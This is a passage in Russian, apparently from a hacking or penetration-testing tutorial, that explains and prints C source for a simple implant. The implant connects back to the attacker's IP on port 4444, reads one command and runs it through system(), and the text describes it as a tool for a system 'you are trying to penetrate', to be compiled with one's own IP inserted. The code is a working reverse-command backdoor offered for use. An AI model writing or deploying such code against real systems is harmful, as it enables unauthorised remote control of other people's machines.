   адреса сводит к минимуму любое взаимодействие с системой, в которую вы пытаетесь проникнуть. Хороший способ
   обработки такого адреса — принять его в командной строке или использовать файл конфигурации. Вы не хотите, чтобы от
   пользователя требовалось какое-либо взаимодействие. Итак, вам следует заранее знать свой IP-адрес, и вы можете просто
   вставить его сюда, скомпилировать программу и запустить ее.

     #include <stdio.h>

     void handleRequest(char *req)
     {
        system(req);
     }

     int main(int argc, char **argv)
     {
        printf("Starting client\n");
        struct sockaddr_in addr;
        struct sockaddr_in srv;
        int sock, data = 0;
        char buffer[256];
        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        {
           printf("Error creating socket! Stopping...\n");
           return -9;
        }
        memset(&srv, '0', sizeof(srv));

        srv.sin_family = AF_INET;
        srv.sin_port = htons(4444);
        if (inet_pton(AF_INET, "127.0.0.1", &srv.sin_addr) <= 0)
        {
           printf("Bad address! Stopping...\n");
           return -8;
        }

        if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) < 0)
        {
           printf("Can't connect! Stopping...\n");
           return -6;
        }

        send(sock, "Connected\n", strlen("Connected\n"), 0);
        data = read(sock, buffer, 255);
        handleRequest(buffer);

        return 0;
     }

   Основная функция настраивает сокет, который будет использоваться для подключения к нашему серверу. Сокет — это
   конструкция данных, первоначально созданная в Калифорнийском университете в Беркли как часть Berkeley Software
    Distribution, воссозданная версия UNIX компании AT&T. Сокет предоставляет структуры данных и дескрипторы, необходимые
   для взаимодействия с другими системами, использующими TCP/IP и связанные протоколы. После настройки сокета и
   подключения клиента к серверу программа отправляет сообщение серверу, а затем ожидает ответа. Получив ответ,
   программа передает строку в функцию system() . При этом операционная система запускает любую строку, как если бы она
   вводилась в командной строке.
